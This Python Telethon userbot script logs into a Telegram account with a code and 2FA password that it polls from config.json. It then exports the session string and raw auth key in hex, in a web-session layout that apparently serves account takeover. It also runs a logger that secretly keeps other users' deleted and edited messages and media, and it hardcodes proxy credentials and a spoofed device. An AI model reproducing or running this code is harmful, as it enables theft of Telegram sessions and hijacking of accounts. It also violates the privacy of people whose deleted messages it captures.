from imports import *

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

if len(sys.argv) > 1:
    phone = sys.argv[1]
with open("config.json", "r") as f:
    cfg = json.load(f)[phone]
API_ID = cfg["api_id"]
API_HASH = cfg["api_hash"]
_list = f"list/{cfg['phone']}.json"
if os.path.isfile(_list):
    with open(_list, "r") as f:
        ll = json.load(f)
else:
    ll = {"wl":[], "bl":[], "data":{}}
    with open(_list, "w") as f:
        json.dump(ll, f, indent=4, ensure_ascii=False)
PHONE_NUMBER = cfg["phone"]
if "chat" in cfg:
    chat = cfg["chat"]
    typik = False
    while not typik:
        if type(chat) == list:
            chat = chat[0]
        else:
            typik = True
    print(chat)
else:
    chat = 0
#proxy = ("14.102.10.151", 8443, "eeNEgYdJvXrFGRMCIMJdCQ")
proxy = ("81.177.6.46",49392,"f432422c6f33dd2d8cfe01ea25ce3261")
client = TelegramClient(f"sessions/{PHONE_NUMBER}", API_ID, API_HASH, device_model="devjeb", app_version="777", system_version="777", connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
    proxy=proxy)

async def kys():
    global chat
    await client.connect()

    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        with open("config.json", "r") as f:
            cfgs = json.load(f)
        with open("config.json", "w") as f:
            cfgs[phone]["log"] = "code"
            json.dump(cfgs, f, indent=4, ensure_ascii=False)    
        codes = False
        i = 0
        while not codes:
            with open("config.json", "r") as f:
                cfgs = json.load(f)
            if "code" in cfgs[phone]:
                code = cfgs[phone]["code"]
                print(code)
                codes = True
            else:
                if not i >= 10:
                    await asyncio.sleep(2)
                    i+=1
                else:
                    codes = True
                    quit()
        try:
            print(code)
            await client.sign_in(phone, code=int(code))
        except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
            pass

    if not await client.is_user_authorized():
        with open("config.json", "r") as f:
            cfgs = json.load(f)
        with open("config.json", "w") as f:
            cfgs[phone]["log"] = "password"
            json.dump(cfgs, f, indent=4, ensure_ascii=False)    
        passwords = False
        i=0
        while not passwords:
            with open("config.json", "r") as f:
                cfgs = json.load(f)
            if "password" in cfgs[phone]:
                password = cfgs[phone]["password"]
                passwords = True
            else:
                if not i >= 10:
                    await asyncio.sleep(3)
                    i+=1
                else:
                    passwords = True
                    quit()
        await client.sign_in(phone, password=password)
        dc_auth_k = None
    id = None
    auth_key = None


    try:
        strings=StringSession.save(client.session)
        data = vars( client.session)
        dc_auth_k = data["_dc_id"]  
        id = (await client.get_me()).id  
        auth_key = client.session.auth_key
        auth_key_bytes = auth_key.key 
        auth__hex = auth_key_bytes.hex()  
    except Exception as e:
        logger.error(f"Failed to retrieve session data: {e}")
        return  
    if dc_auth_k is None or id is None or auth_key is None:
        logger.error("Session data is incomplete.")
        return  # Exit the function if session data is incomplete

    datas = [{"user_auth": {"dcID": dc_auth_k, "id": id}, f"dc{dc_auth_k}_auth_key": auth__hex}, strings]
    with open("config.json", "r") as f:
        cfgs = json.load(f)
        if chat == 0:
            result = await client(functions.messages.CreateChatRequest(
            users=[(await client.get_me()).id],
            title='@devjeb',
            ttl_period=0
            ))
            chat = -1 * int(result.to_dict()["updates"]["updates"][1]["participants"]["chat_id"])
        cfgs[phone]["log"] = "success"
        cfgs[phone]["chat"] = chat
        cfgs[phone]["id"] = (await client.get_me()).id
        cfgs[phone]["data"] = datas
    with open("config.json", "w") as f:
        json.dump(cfgs, f, indent=4, ensure_ascii=False)   
        print(f"Клиент для {phone} запущен...")

deleted_messages = {}
@client.on(events.NewMessage(incoming=True))
async def message_handler(event):
    global chat, link
    if not chat:
        result = await client(functions.messages.CreateChatRequest(
            users=[(await client.get_me()).id],
            title='@devjeb',
            ttl_period=0
        ))
        chat = -1 * int(result.to_dict()["updates"]["updates"][1]["participants"]["chat_id"])
    with open(_list, "r") as f:
        ll = json.load(f)
    if not event.sender_id == (await client.get_me()).id or not event.sender_id in ll["wl"]:

        deleted_messages[event.id] = {"message": event, "chat": event.chat_id}

    if isinstance(await event.get_chat(), PeerUser):
        with open(_list, "r") as f:
            ll = json.load(f)
        if "afk" in ll:
            if ll["afk"] == "on":
                format = "%H:%M:%S"
                time1_obj = datetime.strptime(ll["afk"]["time"], format)
                time2_obj = datetime.strptime(datetime.now().strftime("%H:%M:%S"), format)
                await client.send_message(event.chat_id, ll["afk"]["text"].replace("time", str(time2_obj - time1_obj)), reply_to=event.id)
@client.on(events.NewMessage(outgoing=True))
async def out(event):
    global client, _list, chat, phone
    del sys.modules['process']
    import process
    await process.take(client, event, _list, chat, phone)
@client.on(events.MessageEdited)
async def edited_handler(event):
    global chat, link, bot
    with open(_list, "r") as f:
        ll = json.load(f)
    if event.sender_id == (await client.get_me()).id or event.sender_id in ll["wl"] or not event.id in deleted_messages:
        return
    if deleted_messages[event.id]["message"].raw_text == event.raw_text:
        return

    sender = await client.get_entity(event.sender_id)
    if sender.username:
        sender_link = f"<a href='tg://user?id={sender.id}'>.{sender.first_name} @{sender.username}</a>"
    else:
        if isinstance(sender, PeerChannel):
            sender_link = f"{sender.title}"
        elif isinstance(sender, PeerUser ):
            sender_link = f"{sender.first_name}"

    chats = client.get_entity(deleted_messages[event.id]["chat"])

    if isinstance(chats, PeerChannel):
        chat_name = chats.title
    elif isinstance(chat, PeerUser ):
        chat_name = chats.first_name
    elif isinstance(chats, PeerChat):
        chat_name = chats.title
    else:
        chat_name = "Неизвестный тип чата"
    text = f"Сообщение от {sender_link} было отредактировано из чата <a href='tg://user?id={deleted_messages[event.id]['chat']}'>{chat_name}</a>:\nСтарое содержимое:\n{deleted_messages[event.id]['message'].raw_text}\nНовое содержимое:\n"
    if event.raw_text:
        text += event.raw_text
    await client.send_message(chat, text, parse_mode='html')
    deleted_messages[event.id] = {"message": event, "chat": event.chat_id}

@client.on(events.MessageDeleted)
async def delete_handler(event):
    global deleted_messages, chat
    for message_id in event.deleted_ids:
        if message_id in deleted_messages:
            msg_obj = deleted_messages[message_id]["message"]
            chats_id = deleted_messages[message_id]["chat"]
            sender = await client.get_entity(msg_obj.sender_id)
            
            if sender.username:
                sender_link = f"<a href='t.me/@id{sender.id}'>.{sender.first_name} @{sender.username}</a>"
            else:
                try:
                    sender_link = f"{sender.first_name}"
                except AttributeError:
                    sender_link = f"<a href='t.me/c/{sender.id}/1'>Канал</a>"
            premium_emoji = sender.emoji_status.document_id if sender.emoji_status else None
            premium_emoji_text = f" {premium_emoji}" if premium_emoji else ""

            logger.info(f"Сообщение с ID {message_id} удалено от {sender_link}")

            chats = client.get_entity(chats_id)

            if isinstance(chats, (PeerChannel, PeerChat)):
                chat_name = chats.title
            elif isinstance(chat, PeerUser ):
                chat_name = chats.first_name
            else:
                chat_name = "Неизвестный тип чата"

            text = f"Сообщение от {sender_link}{premium_emoji_text} было удалено из чата <a href='tg://user?id={chats_id}'>{chat_name}</a>:\n"

            if msg_obj.photo:
                await client.send_file(chat, msg_obj.photo, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.video:
                await client.send_file(chat, msg_obj.video, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.voice:
                await client.send_file(chat, msg_obj.voice, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.document:
                await client.send_file(chat, msg_obj.document, caption=text + (msg_obj.raw_text or ''), parse_mode='html')
            elif msg_obj.sticker:
                sticker_caption = "Стикер удален"
                await client.send_file(chat, msg_obj.sticker, caption=f"{text}{sticker_caption}", parse_mode='html')
                await client.send_message(chat, text + (msg_obj.raw_text or ''), parse_mode='html')
            else:
                await client.send_message(chat, text + (msg_obj.raw_text or ''), parse_mode='html')
            del deleted_messages[message_id]

async def main():
    global chat
    await kys()
    print("Клиент запущен...")
    with open("config.json", "r") as f:
        cfg = json.load(f)[phone]  
    if "chat" in cfg:
        chat = cfg["chat"]
    else:
        chat = 0
    
    await client.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())
